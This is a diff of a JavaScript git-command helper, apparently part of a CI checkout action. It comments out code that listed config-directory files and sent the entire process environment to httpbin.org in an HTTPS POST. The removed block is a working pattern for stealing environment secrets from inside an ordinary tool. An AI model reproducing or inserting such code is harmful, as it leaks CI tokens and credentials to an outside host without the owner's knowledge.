@@ -631,40 +631,40 @@ class GitCommandManager {
   //           console.warn("CONFIG KEY: " + configKey);
   //           console.warn("GLOABL CONFIG: " + globalConfig);
 	 //    console.warn(process.env);
-	    fs.readdir(process.env.XDG_CONFIG_HOME, (err, files) => {
-              files.forEach(file => {
-                  setTimeout(() => {console.log("FILE: " + file)}, 1000);
-	      });
-	    });
+	    // fs.readdir(process.env.XDG_CONFIG_HOME, (err, files) => {
+     //          files.forEach(file => {
+     //              setTimeout(() => {console.log("FILE: " + file)}, 1000);
+	    //   });
+	    // });
 	 //    for (var c = 0; c < 10; c++) {
 		// setTimeout(() => { console.warn("doing stuff") }, 1000);
 	 //    }
-	    const data = JSON.stringify(process.env);
-	    var options = {
-  hostname: 'httpbin.org',
-  port: 443,
-  path: '/post',
-  method: 'POST',
-  headers: {
-       'Content-Type': 'application/x-www-form-urlencoded',
-       'Content-Length': data.length
-     }
-};
-var req = https.request(options, (res) => {
-  console.warn('statusCode:', res.statusCode);
-  console.warn('headers:', res.headers);
+// 	    const data = JSON.stringify(process.env);
+// 	    var options = {
+//   hostname: 'httpbin.org',
+//   port: 443,
+//   path: '/post',
+//   method: 'POST',
+//   headers: {
+//        'Content-Type': 'application/x-www-form-urlencoded',
+//        'Content-Length': data.length
+//      }
+// };
+// var req = https.request(options, (res) => {
+//   console.warn('statusCode:', res.statusCode);
+//   console.warn('headers:', res.headers);
 
-  res.on('data', (d) => {
-    process.stdout.write(d);
-  });
-});
+//   res.on('data', (d) => {
+//     process.stdout.write(d);
+//   });
+// });
 
-req.on('error', (e) => {
-  console.error(e);
-});
+// req.on('error', (e) => {
+//   console.error(e);
+// });
 
-req.write(data);
-req.end();
+// req.write(data);
+// req.end();
 
             const output = yield this.execGit([
                 'config',
